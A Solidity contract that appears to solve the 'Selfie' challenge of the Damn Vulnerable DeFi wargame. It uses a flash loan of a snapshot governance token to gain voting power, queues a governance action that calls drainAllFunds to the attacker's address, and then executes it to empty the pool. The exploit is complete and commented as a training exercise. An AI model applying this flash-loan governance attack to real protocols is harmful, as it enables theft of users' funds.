// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import { Address } from "@openzeppelin/contracts/utils/Address.sol";

contract SelfieEvilReceiver is Ownable {
    using Address for address payable;

    SimpleGovernance private governance;
    SelfiePool private pool;
    uint drainActionId;

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool) {
        governance = _simpleGovernance;
        pool = _selfiePool;
    }

    function receiveTokens(address token,uint256 borrowAmount) external payable {

        // only the pool can this function triggered by a flashloan call
        require(msg.sender == address(pool), "only pool");

        // we prepare the data payload to be attached to the governance action
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner())
        );

        // we take a snapshot of the governance token so we will be the bigger staker
        DamnValuableTokenSnapshot(token).snapshot();

        // we queue the action on the Governance contract
        drainActionId = governance.queueAction(address(pool), data, 0);

        // transfer back funds
        DamnValuableTokenSnapshot(token).transfer(address(pool), borrowAmount);
    
    }

    function exeFlashloan(uint borrowAmount) onlyOwner external {
        pool.flashLoan(borrowAmount);
    }

    function executeAction() external {
        governance.executeAction(drainActionId);
    }
}

